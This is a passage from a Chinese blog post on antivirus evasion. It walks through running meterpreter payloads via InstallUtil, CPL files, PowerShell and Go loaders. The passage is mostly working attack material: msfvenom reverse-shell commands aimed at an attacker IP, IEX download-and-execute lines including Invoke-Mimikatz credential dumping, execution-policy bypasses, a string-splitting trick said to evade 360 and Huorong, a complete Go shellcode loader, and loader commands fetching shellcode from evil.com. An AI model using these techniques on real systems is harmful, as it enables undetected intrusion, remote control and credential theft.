<p>编译生成的shell.exe直接执行是不行的，需要使用InstallUtil.exe来触发。</p>
<p>使用InstallUtil.exe执行shell.exe，360安全卫士会检测到InstallUtil.exe执行预警，360杀毒和火绒动态和静态均无预警。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\test\shell.exe</span><br></pre></td></tr></table></figure>



<h4 id="2-从资源里加载shelllcode"><a href="#2-从资源里加载shelllcode" class="headerlink" title="2.从资源里加载shelllcode"></a>2.从资源里加载shelllcode</h4><p>这里只介绍另外一种从资源里加载shelllcode的方法，不过很遗憾的是这个我没有复现成功。</p>
<p>参考自三好学生大佬的文章:<code>https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html</code></p>
<p>需要用到这个工具<code>https://github.com/rvrsh3ll/CPLResourceRunner</code></p>
<p>先用Cobalt Strike 生成shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output =&gt; RAW (x86)</span><br></pre></td></tr></table></figure>

<p>然后用<code>ConvertShellcode.py</code>将生成的<code>beacon.bin</code>转换成<code>shellcode.txt</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ConvertShellcode.py beacon.bin</span><br></pre></td></tr></table></figure>

<p>然后再转换成base64编码。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode.txt |sed &#x27;s/[, ]//g; s/0x//g;&#x27; |tr -d &#x27;\n&#x27; |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</span><br></pre></td></tr></table></figure>

<p>把生成的base64编码的shellcode复制到项目资源<code>CPLResourceRunner/Resources.txt</code>里。</p>
<p>编译生成dll，并将生成的<code>CPLResourceRunner.dll</code>重命名为<code>.cpl</code>文件，之后执行即可</p>
<p>不过经过测试，无法上线，没找出来具体原因。</p>
<p>msf生成spl木马</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp lhost=192.168.43.30 lport=3333  -f dll  &gt; shellcode.cpl</span><br></pre></td></tr></table></figure>

<p>执行：</p>
<p>(1) 双击直接运行</p>
<p>(2) cmd下输入<code>rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;</code></p>
<p>(3) cmd下输入<code>control &lt;文件名&gt;</code></p>
<h2 id="4-powershell"><a href="#4-powershell" class="headerlink" title="4.powershell"></a>4.powershell</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Tw-FAduHMVzek_YxIErQDQ">https://mp.weixin.qq.com/s/Tw-FAduHMVzek_YxIErQDQ</a></p>
<h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h3><h4 id="1-powershell版本问题"><a href="#1-powershell版本问题" class="headerlink" title="1.powershell版本问题"></a>1.powershell版本问题</h4><p>powershell只能针对win7之后的系统，之前的win操作系统默认没有安装powershell。不同架构的payload（x86或x64）需要不同版本的powershell来加载，否则会出错。</p>
<p>64位所在目录：<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></p>
<p>32位所在目录：<code>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code></p>
<h4 id="2-常见执行方式"><a href="#2-常见执行方式" class="headerlink" title="2.常见执行方式"></a>2.常见执行方式</h4><p><strong>网络环境直接执行代码</strong></p>
<p>无文件写入，相对较为隐蔽。下面代码为加载远程脚本<code>Invoke-Mimikatz.ps1</code>，执行Mimikatz的DumpCreds功能。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.211.55.2/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>

<p><strong>本地执行</strong></p>
<p>先把<code>[http://10.211.55.2/Invoke-Mimikatz.ps1](http://10.211.55.2/Invoke-Mimikatz.ps1)</code>下载到本地</p>
<p>然后导入<code>powershell Import-Module .\Invoke-Mimikatz.ps1</code></p>
<p>使用命令<code>Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#39;</code></p>
<p>或者<code>Invoke-Mimikatz -DumpCreds</code></p>
<h4 id="3-执行策略"><a href="#3-执行策略" class="headerlink" title="3.执行策略"></a>3.执行策略</h4><p>查看执行策略<code>powershell Get-ExecutionPolicy</code></p>
<p>powershell有六种执行策略：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Unrestricted ：权限最高，可以不受限制执行任意脚本</span><br><span class="line">Restricted ：默认策略，不允许任意脚本的执行</span><br><span class="line">AllSigned ：所有脚本必须经过签名运行</span><br><span class="line">RemoteSigned ：本地脚本无限制，但是对来自网络的脚本必须经过签名</span><br><span class="line">Bypass ：没有任何限制和提示</span><br><span class="line">Undefined ：没有设置脚本的策略</span><br></pre></td></tr></table></figure>

<p>默认情况下，禁止脚本执行。除非管理员更改执行策略。</p>
<p><code>powershell Set-ExecutionPolicy Unrestricted</code>设置执行策略（需要管理员权限）</p>
<p>绕过执行策略执行大概有以下几种：</p>
<p><strong>本地读取然后通过管道符运行</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Get-Content 1.ps1 | powershell -NoProfile -</span><br></pre></td></tr></table></figure>

<p><strong>远程下载并通过IEX运行脚本</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://47.94.80.129/ps/a.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Bypass执行策略绕过</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy bypass -File ./a.ps1</span><br></pre></td></tr></table></figure>

<p>不会显示警告和提示</p>
<p><strong>Unrestricted执行策略标志</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy unrestricted -File ./a.ps1</span><br></pre></td></tr></table></figure>

<p>当运行一个从网上下载的未签名的脚本时，会给出权限提示</p>
<p>需要解释的是：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。</span><br><span class="line">WindowStyle Hidden（-w Hidden）：隐藏窗口</span><br><span class="line">Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。</span><br><span class="line">NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</span><br><span class="line">Noexit（-Noe）：执行后不退出Shell。</span><br><span class="line">EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题</span><br></pre></td></tr></table></figure>



<h3 id="2-powershell加载shellcode方法"><a href="#2-powershell加载shellcode方法" class="headerlink" title="2.powershell加载shellcode方法"></a>2.powershell加载shellcode方法</h3><h4 id="1-msf-ps1本地执行-VT-20-59-过360"><a href="#1-msf-ps1本地执行-VT-20-59-过360" class="headerlink" title="1.msf-ps1本地执行(VT:20&#x2F;59 过360)"></a>1.msf-ps1本地执行(VT:20&#x2F;59 过360)</h4><p>用msfvenom生成powershell马，注意这里是<code>-f psh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/x64/meterpreter/reverse_https -e x86/shikata_ga_nai -i 15 -b &#x27;\x00&#x27; lhost=192.168.43.30 lport=3333 -f psh -o shell.ps1</span><br></pre></td></tr></table></figure>

<p>将shell.ps1拷贝到测试机器上，本地执行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -NoExit -File  shell.ps1</span><br></pre></td></tr></table></figure>



<h4 id="2-Invoke-Shellcode加载（VT-shell-ps1-0-59）"><a href="#2-Invoke-Shellcode加载（VT-shell-ps1-0-59）" class="headerlink" title="2.Invoke-Shellcode加载（VT:shell.ps1-0&#x2F;59）"></a>2.Invoke-Shellcode加载（VT:shell.ps1-0&#x2F;59）</h4><p>先用msfvenom生成脚本木马</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.43.30 LPORT=3333 -f powershell -o shell.ps1</span><br></pre></td></tr></table></figure>

<p>在目标机器上执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&quot;</span>)</span><br><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://192.168.43.30/shell.ps1&quot;</span>)</span><br><span class="line"><span class="built_in">Invoke-Shellcode</span> <span class="literal">-Shellcode</span> (<span class="variable">$buf</span>) <span class="literal">-Force</span>  运行木马</span><br></pre></td></tr></table></figure>



<h4 id="3-Invoke-Obfuscation对ps1免杀-VT-4-58"><a href="#3-Invoke-Obfuscation对ps1免杀-VT-4-58" class="headerlink" title="3.Invoke-Obfuscation对ps1免杀	(VT:4&#x2F;58)"></a>3.Invoke-Obfuscation对ps1免杀	(VT:4&#x2F;58)</h4><p>powershell的免杀方法有很多，对代码进行编码是最常见的一种，这里介绍一个专门用来对powershell进行编码免杀的框架Invoke-Obfuscation，这也是著名的APT32组织海莲花常用的一个工具。</p>
<p>Invoke-Obfuscation主要是对ps1脚本进行免杀，所以这里还是需要现有一个ps的payload，我还是用法1的msf生成的payload。</p>
<p>下载<code>Invoke-Obfuscation</code>：<code>git clone https://github.com/danielbohannon/Invoke-Obfuscation</code></p>
<p>进入Invoke-Obfuscation目录，在powershell中执行<code>Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation</code></p>
<p>然后执行<code>set scriptpath c:\test\shell.ps1</code> 指定待处理的Ps1文件，或者<code>set scriptblock &#39;echo xss&#39;</code>指定待处理的ps代码</p>
<p>然后输入<code>encoding</code>，再选择编码方式，比如1</p>
<p>然后执行<code>out c:\test\jiami.ps1</code>即可输出处理好的ps1文件.</p>
<p>本地执行可上线<code>powershell.exe -ExecutionPolicy Bypass -NoExit -File c:\test\jiami.ps1</code></p>
<h4 id="4-ps1行为免杀"><a href="#4-ps1行为免杀" class="headerlink" title="4.ps1行为免杀"></a>4.ps1行为免杀</h4><p>虽然ps1代码自身免杀，但在用powershell执行远程下载或执行shellcode时，很容易触发杀软行为规则。</p>
<p>对于IEX这种方便快捷的方式直接运行会被360拦截。可尝试从语法上简单变化。主要是对DownloadString、http做一些处理。</p>
<p>比如利用replace替换函数，可以bypass。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoExit &quot;$c1=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;$c2=&#x27;123(&#x27;&#x27;http://192.168.43.30/shell.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX ($c1+$c2)&quot;</span><br></pre></td></tr></table></figure>

<p>可过360和火绒</p>
<h2 id="5-go"><a href="#5-go" class="headerlink" title="5.go"></a>5.go</h2><p>目标机器不一定有go环境，且go编译出来的exe大约2.3M左右，使用upx压缩下大约1.5M,不过相比python编译的exe应该还能接受了，免杀效果还比python-exe要好一些。</p>
<h3 id="1-Go嵌入shellcode"><a href="#1-Go嵌入shellcode" class="headerlink" title="1.Go嵌入shellcode"></a>1.Go嵌入shellcode</h3><p>先用msfvenom生成C语言的shellcode，注意要生成x64的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.43.30 lport=3333 -f c</span><br></pre></td></tr></table></figure>

<p>将shellcode转换成16进制的形式例如：\xfc-&gt;0xfc</p>
<p>将转换后的shellcode替换到下面的<code>shellcode_buf</code>位置，文件保存为<code>shell.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    <span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">    MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">    PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    kernel32       = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">    ntdll          = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">    VirtualAlloc   = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">    RtlCopyMemory  = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">    shellcode_buf = []<span class="type">byte</span>&#123; </span><br><span class="line">        <span class="number">0xfc</span>, <span class="number">0x48</span>,  ----shellcode----, <span class="number">0xd5</span>,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkErr</span><span class="params">(err <span class="type">error</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">            <span class="built_in">println</span>(err.Error())</span><br><span class="line">            os.Exit(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    shellcode := shellcode_buf</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(os.Args) &gt; <span class="number">1</span> &#123;</span><br><span class="line">        shellcodeFileData, err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line">        checkErr(err)</span><br><span class="line">        shellcode = shellcodeFileData</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">    <span class="keyword">if</span> addr == <span class="number">0</span> &#123;</span><br><span class="line">        checkErr(err)</span><br><span class="line">    &#125;</span><br><span class="line">    _, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    checkErr(err)</span><br><span class="line">    syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安装golang，参考：<code>[https://www.runoob.com/go/go-environment.html](https://www.runoob.com/go/go-environment.html)</code></p>
<p>在命令行执行命令<code>go build</code>，编译生成<code>test.exe</code>，在测试机执行。不过大约两分钟后，360安全大脑提示云查杀报警了。</p>
<p>在网上还找到另外一个代码，不过执行和编译老出错，有兴趣的可以试一下，代码如下。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    buf := <span class="string">&quot;&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;xddxc6xd9x74x24xf4x5fx33xc9xb8xb3x5ex2c&quot;</span></span><br><span class="line">    ...省略...</span><br><span class="line">    buf += <span class="string">&quot;xc9xb1x97x31x47x1ax03x47x1ax83xc7x04xe2&quot;</span></span><br><span class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></span><br><span class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></span><br><span class="line">    shellcode := []<span class="type">byte</span>(buf)</span><br><span class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-Go加载器"><a href="#2-Go加载器" class="headerlink" title="2.Go加载器"></a>2.Go加载器</h3><h4 id="1-go-shellcode加载器-VT查杀率4-69"><a href="#1-go-shellcode加载器-VT查杀率4-69" class="headerlink" title="1.go-shellcode加载器(VT查杀率4&#x2F;69)"></a>1.go-shellcode加载器(VT查杀率4&#x2F;69)</h4><p>需要先下载加载器：<code>https://github.com/brimstone/go-shellcode</code></p>
<p>下载后，进入<code>go-shellcode\cmd\sc</code>目录，执行<code>go build</code>(cmd下即可)生成<code>sc.exe</code></p>
<p>然后用Msfvenom生成hex格式的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f hex -o shell.hex LHOST=192.168.43.30 LPORT=3333</span><br></pre></td></tr></table></figure>

<p>使用sc加载器进行加载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe shellcode</span><br></pre></td></tr></table></figure>



<h4 id="2-gsl加载器"><a href="#2-gsl加载器" class="headerlink" title="2.gsl加载器"></a>2.gsl加载器</h4><p>gsl是<code>Jayl1n</code>根据go-shellcode进行了修改完善的工具。</p>
<p>下载gsl加载器：<code>wget https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip</code></p>
<p>包含两个版本，x86和x64。提供了三种加载方式</p>
<p>1、从参数传入 （必须是HEX格式）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsl -s SHELLCODE -hex</span><br></pre></td></tr></table></figure>

<p>2、从文件传入</p>
<p>加载 RAW 格式：<code>gsl -f shell.raw</code></p>
<p>加载 HEX 格式：<code>gsl -f shell.hex -hex</code></p>
<p>3、从远程服务器加载</p>
<p>把 SHELLCODE 文件挂在WEB目录下。（支持HTTP&#x2F;HTTPS）</p>
<p>加载 RAW 格式：<code>gsl -u [http://evil.com/shell.raw](http://evil.com/shell.raw)</code></p>
<p>加载 HEX 格式：<code>gsl -u [http://evil.com/shell.hex](http://evil.com/shell.hex) -hex</code></p>
<p>以x64为例进行测试，先生成x64的shellcode</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.211.55.2 LPORT=3333 -f hex -o shell.hex</span><br></pre></td></tr></table></figure>

<p>试一下远程加载<code>gsl64.exe -u http://192.168.43.30/shell.hex -hex</code>即可上线</p>
<p>更多免杀参考：<a target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus/">https://github.com/TideSec/BypassAntiVirus/</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">senu11</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/10/04/%E5%85%8D%E6%9D%80%E4%BA%8C-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80/">http://example.com/2020/10/04/免杀二-脚本语言免杀/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">senu11</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/C-C-%E4%B9%8B11%E7%A7%8D%E6%96%B9%E6%B3%95%E5%85%8D%E6%9D%80/">C/C++之11种方法免杀</a><a class="post-meta__tags" href="/tags/python%E4%B9%8B7%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">python之7种免杀方法</a><a class="post-meta__tags" href="/tags/c-%E4%B9%8B5%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">c#之5种免杀方法</a><a class="post-meta__tags" href="/tags/powershell%E4%B9%8B4%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">powershell之4种免杀方法</a><a class="post-meta__tags" href="/tags/go%E4%B9%8B3%E7%A7%8D%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95/">go之3种免杀方法</a></div><div class="post_share"><div class="social-share" data-image="/img/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/10/03/%E5%85%8D%E6%9D%80%E4%B8%80-%E5%B7%A5%E5%85%B7%E5%85%8D%E6%9D%80/" title="免杀一-工具免杀"><img class="cover" src="/img/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">免杀一-工具免杀</div></div></a></div><div class="next-post pull-right"><a href="/2020/10/05/%E5%85%8D%E6%9D%80%E6%96%87%E6%A1%A3%E5%88%B6%E4%BD%9C/" title="免杀文档制作"><img class="cover" src="/img/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">免杀文档制作</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-c-c"><span class="toc-number">1.</span> <span class="toc-text">1.c&#x2F;c++</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%EF%BC%88VT-24-70%EF%BC%8C%E8%BF%87360%E5%92%8C%E5%BE%AE%E8%BD%AF%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">1.源码编译（VT:24&#x2F;70，过360和微软）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.指针执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%94%B3%E8%AF%B7%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%EF%BC%88VT-26-69%EF%BC%8C%E8%BF%87360%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.申请动态内存加载（VT:26&#x2F;69，过360）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B5%8C%E5%85%A5%E6%B1%87%E7%BC%96%E5%8A%A0%E8%BD%BD%EF%BC%88VT-23-70-%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.嵌入汇编加载（VT:23&#x2F;70 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.强制类型转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%B1%87%E7%BC%96%E8%8A%B1%E6%8C%87%E4%BB%A4"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.汇编花指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-XOR%E5%8A%A0%E5%AF%86-VT-23-70"><span class="toc-number">1.1.6.</span> <span class="toc-text">6.XOR加密(VT:23&#x2F;70 )</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-base64%E5%8A%A0%E5%AF%86%E6%B3%95"><span class="toc-number">1.1.7.</span> <span class="toc-text">7.base64加密法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-python%E5%8F%98%E5%BD%A2shellcode-%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81-%E6%9C%AA%E8%83%BD%E5%A4%8D%E7%8E%B0%E6%88%90%E5%8A%9F"><span class="toc-number">1.1.8.</span> <span class="toc-text">8.python变形shellcode+汇编代码(未能复现成功)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-python-xor%E5%A4%84%E7%90%86%EF%BC%88VT-20-70-%E4%B8%8D%E8%83%BD%E8%BF%87360%EF%BC%89"><span class="toc-number">1.1.9.</span> <span class="toc-text">9.python+xor处理（VT:20&#x2F;70 不能过360）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">2.shellcode加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8shellcode-launcher%EF%BC%88%E8%BF%87%E4%B8%8D%E4%BA%86%E5%BE%AE%E8%BD%AF%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.使用shellcode_launcher（过不了微软）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8SSI%E5%8A%A0%E8%BD%BD-VT-24-71-%E8%BF%87360"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.使用SSI加载(VT:24&#x2F;71 过360)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 